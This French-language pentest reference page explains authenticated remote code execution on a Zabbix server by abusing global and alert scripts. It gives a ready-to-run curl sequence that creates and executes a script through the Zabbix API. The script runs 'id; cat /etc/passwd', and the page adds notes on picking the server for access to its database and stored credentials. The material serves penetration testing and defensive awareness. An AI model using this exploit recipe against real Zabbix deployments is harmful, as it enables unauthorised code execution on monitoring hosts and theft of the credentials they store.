---
title: "Scripts globaux et scripts d'alerte : exécution de commandes sur le serveur Zabbix"
order: 2
description: "Les scripts globaux de Zabbix et les scripts d'alerte (action) de type Script exécutent des commandes définies par l'attaquant, lancées sur le serveur Zabbix ou sur un agent choisi. Un Super admin crée un script de type Script avec une commande et l'exécute depuis l'interface ou via la méthode script.execute de l'API, obtenant l'exécution de code sous le compte de service du serveur Zabbix, la RCE Zabbix authentifiée classique."
keywords:
  - global scripts
  - alert scripts
  - script.execute
  - zabbix server
  - rce
---

# Scripts globaux et scripts d'alerte

Zabbix permet aux administrateurs de définir des scripts qui exécutent des commandes, et c'est la voie d'exécution de code authentifiée la plus directe. Un script global (Alerts > Scripts) de type « Script » contient une commande et est configuré pour s'exécuter sur le serveur Zabbix, un agent Zabbix ou un proxy ; un script d'alerte (action) s'exécute de façon similaire lorsqu'une action se déclenche. Un Super admin crée un tel script avec une commande d'attaquant et l'exécute, depuis l'interface ou via `script.create` + `script.execute` de l'API, et la commande s'exécute sur la cible choisie sous le compte de service de ce composant. L'exécution sur le serveur Zabbix fournit un point d'appui sur l'hôte de supervision lui-même (ainsi que l'accès à sa base de données et à tous les identifiants stockés) ; l'exécution sur un agent atteint un hôte supervisé. C'est la RCE Zabbix post-authentification canonique.

```bash
Z=https://<target>/zabbix/api_jsonrpc.php; H='Content-Type: application/json-rpc'
# create a global script of type Script (type 0) that runs on the Zabbix server (execute_on 1)
SID=$(curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"script.create","params":{
  "name":"x","type":0,"command":"id; cat /etc/passwd","scope":1,"execute_on":1},"auth":"'"$TOK"'","id":1}' | jq -r .result.scriptids[0])
# execute it against a host; output is returned in the API response
curl -sk $Z -H "$H" -d '{"jsonrpc":"2.0","method":"script.execute","params":{"scriptid":"'"$SID"'","hostid":"<HOSTID>"},"auth":"'"$TOK"'","id":1}'
```

## Notes d'exploitation

- `execute_on` sélectionne la cible : sur le serveur Zabbix (point d'appui sur l'hôte de supervision ainsi que sa base de données et tous les identifiants stockés) ou sur un agent (atteindre un hôte supervisé) ; le serveur est généralement la cible de plus grande valeur.
- La commande s'exécute sous le compte de service du serveur Zabbix ; la sortie est renvoyée directement dans la réponse de `script.execute`, ce qui en fait une primitive propre de type interactif.
- Cela nécessite la permission de gestion des scripts, que possède le Super admin ; c'est la raison pour laquelle un compte Zabbix Super admin équivaut de fait à l'exécution de code sur le serveur.
- Les `alertscripts` (scripts d'opération d'action) sont l'équivalent côté alerte et s'exécutent depuis le répertoire des scripts externes du serveur ; les deux aboutissent à la même exécution.

## Références

- [Zabbix : scripts](https://www.zabbix.com/documentation/current/en/manual/web_interface/frontend_sections/alerts/scripts)
- [HackTricks : Zabbix scripts RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-zabbix)
